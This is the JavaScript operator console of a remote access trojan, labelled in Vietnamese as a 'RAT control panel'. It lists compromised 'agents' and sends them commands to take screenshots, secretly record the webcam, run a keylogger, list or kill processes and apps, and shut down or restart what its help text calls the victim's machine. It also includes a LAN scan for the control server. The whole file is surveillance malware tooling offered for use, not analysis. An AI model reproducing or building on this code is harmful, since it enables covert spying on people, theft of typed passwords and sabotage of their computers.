import { CONFIG } from './modules/config.js';
import { Gateway } from './modules/gateway.js';

const appState = {
    isConnected: false,
    sessionId: null,
    agents: [],
    currentTarget: 'ALL'
};

const ui = {
    log: (src, msg) => console.log(`%c[${src}] ${msg}`, 'color: #00ff00; font-family: monospace;'),
    error: (src, msg) => console.log(`%c[${src}] ${msg}`, 'color: #ff0000; font-weight: bold;'),
    warn: (src, msg) => console.log(`%c[${src}] ${msg}`, 'color: #ffff00;'),
    info: (msg) => console.log(`%c${msg}`, 'color: cyan; font-weight: bold;'),
    updateAgentList: (agents) => {
        console.group("=== DANH SÁCH AGENT ONLINE ===");
        console.table(agents);
        console.groupEnd();
    },
    renderList: (title, data) => {
        console.group(`=== ${title} ===`);
        console.table(data);
        console.groupEnd();
    }
};

const gateway = new Gateway({
    onConnected: () => {
        ui.log("System", "Đã kết nối tới Gateway! Vui lòng gọi `auth()` để đăng nhập.");
        appState.isConnected = true;
    },
    onDisconnected: () => {
        ui.warn("System", "Mất kết nối Gateway.");
        appState.isConnected = false;
        appState.agents = [];
    },
    onAuthSuccess: () => {
         ui.log("System", "Đăng nhập thành công! Đang tải danh sách Agent...");
    },
    onAgentListUpdate: (agentList) => {
        ui.log("System", `Cập nhật danh sách Agent: ${agentList.length} thiết bị.`);
        appState.agents = agentList;
        if (appState.currentTarget !== 'ALL' && !agentList.find(a => a.id === appState.currentTarget)) {
            ui.warn("System", `Target ${appState.currentTarget} đã offline. Reset về 'ALL'.`);
            appState.currentTarget = 'ALL';
            gateway.setTarget('ALL');
        }
        ui.updateAgentList(agentList);
    },
    onScreenshot: (base64Data, agentId) => {
        ui.log("Spy", `Nhận ảnh màn hình từ ${agentId}`);
        const modal = document.getElementById('image-modal');
        const img = document.getElementById('modal-img');
        
        if (img && modal) {
            img.src = "data:image/jpeg;base64," + base64Data;
            modal.classList.remove('hidden');
            modal.style.display = 'block';
        } else {
            console.log("%c[ẢNH]", "font-size: 50px; background-image: url(data:image/jpeg;base64," + base64Data + ")");
        }
    },
    onCamera: (videoData, agentId) => {
        ui.log("Spy", `Nhận video từ ${agentId}, đang tải xuống...`);
        const link = document.createElement('a');
        link.href = "data:video/mp4;base64," + videoData;
        link.download = `cam_${agentId}_${Date.now()}.mp4`;
        link.click();
    },
    onKeylog: (keyData, agentId) => {
        const keylogPanel = document.getElementById('keylog-panel');
        if (keylogPanel) {
            keylogPanel.value += keyData;
            keylogPanel.scrollTop = keylogPanel.scrollHeight;
        }
        console.log(`%c[Keylog - ${agentId}]: ${keyData.replace(/\n/g, '\\n')}`, 'color: orange');
    },
    onMessage: (msg) => {
        console.log("Raw Msg: ", msg);
    },
    onError: (err) => {
        ui.error("Main", err);
    }
});

window.ui = ui; 

window.help = () => {
    console.clear();
    console.log("%c=== RAT CONTROL PANEL - HƯỚNG DẪN ===", "color: #fff; background: #8b5cf6; font-size: 16px; padding: 10px; border-radius: 5px; width: 100%; display: block;");
    
    console.group("%c1. KẾT NỐI & QUẢN LÝ", "color: #3b82f6");
    //console.log("connect(ip)       - Kết nối tới server (VD: connect('localhost'))");
    console.log("getAgentList()    - fetch agent list")
    console.log("auth()            - Đăng nhập (Bắt buộc sau khi connect)");
    console.log("scan()            - Quét mạng LAN tìm IP Server");
    console.log("setTarget('ID')   - Chọn mục tiêu cụ thể (hoặc 'ALL')");
    console.log("whoami()          - Lấy tên máy của mục tiêu");
    console.groupEnd();

    console.group("%c2. GIÁN ĐIỆP & THEO DÕI", "color: #ef4444");
    console.log("screenshot()      - Chụp ảnh màn hình");
    console.log("recordCam(s)      - Quay lén webcam (s: số giây, mặc định 5)");
    console.log("startKeylog()     - Bắt đầu nhận keylog");
    console.log("stopKeylog()      - Dừng keylog");
    console.groupEnd();

    console.group("%c3. ỨNG DỤNG & TIẾN TRÌNH", "color: #22c55e");
    console.log("listApps()        - Xem danh sách ứng dụng đã cài");
    console.log("startApp(id)      - Mở ứng dụng theo ID (lấy từ listApps)");
    console.log("stopApp(id)       - Tắt ứng dụng theo ID");
    console.log("listProcs()       - Xem danh sách tiến trình đang chạy");
    console.log("startProc(id)     - (Ít dùng) Chạy process");
    console.log("stopProc(id)      - Kill process theo PID");
    console.groupEnd();

    console.group("%c4. KHÁC", "color: #eab308");
    console.log("echo('msg')       - Gửi tin nhắn test (hiện popup/log bên agent)");
    console.log("shutdownAgent()   - Tắt máy nạn nhân");
    console.log("restartAgent()   - Tắt máy nạn nhân");
    console.log("help()            - Xem lại bảng này");
    console.groupEnd();
    
    return "Hãy bắt đầu bằng lệnh: connect('localhost')";
};

gateway.connect('localhost');

window.getAgentList = () => {
    gateway.refreshAgents();
}

window.auth = () => {
    if(!gateway.ws || gateway.ws.readyState !== WebSocket.OPEN) {
        ui.error("CMD", "Chưa kết nối! Hãy gọi connect('IP') trước.");
        return;
    }
    gateway.authenticate();
};

window.scan = () => {
    ui.info("[Main] Đang quét mạng (192.168.1.x)...");
    scanner.scan("192.168.1.", (foundIp) => {
        ui.log("Scanner", `Tìm thấy server tại: ${foundIp}`);
        gateway.connect(foundIp);
    });
};

window.setTarget = (agentId) => {
    appState.currentTarget = agentId;
    gateway.setTarget(agentId);
    ui.info(`[Control] Đã khóa mục tiêu: ${agentId}`);
}

// App Control
window.listApps = () => gateway.fetchAppList();
window.startApp = (id) => gateway.startApp(id);
window.stopApp = (id) => gateway.killApp(id);

// Process Control
window.listProcs = () => gateway.fetchProcessList();
window.startProc = (id) => gateway.startProcess(id);
window.stopProc = (id) => gateway.killProcess(id);

// Spy
window.whoami = () => gateway.send(CONFIG.CMD.WHOAMI, "");
window.echo = (text) => gateway.send(CONFIG.CMD.ECHO, text);
window.screenshot = () => gateway.send(CONFIG.CMD.SCREENSHOT, "");
window.recordCam = (duration = 5) => gateway.send(CONFIG.CMD.CAM_RECORD, String(duration));

// Keylog
window.startKeylog = () => {
    ui.info("[CMD] Bật Keylogger...");
    gateway.send(CONFIG.CMD.START_KEYLOG, JSON.stringify({interval: 0.5}));
};
window.stopKeylog = () => {
    ui.info("[CMD] Tắt Keylogger...");
    gateway.send(CONFIG.CMD.STOP_KEYLOG, "");
};

// Power
window.shutdownAgent = () => {
    if(confirm("CẢNH BÁO: Bạn chắc chắn muốn tắt máy mục tiêu?")) {
        gateway.send(CONFIG.CMD.SHUTDOWN, "");
    }
}

window.restartAgent = () => {
    if (confirm("RESTART?")) {
        gateway.send(CONFIG.CMD.RESTART, "");
    }
}

document.addEventListener('DOMContentLoaded', () => {
    window.help();
});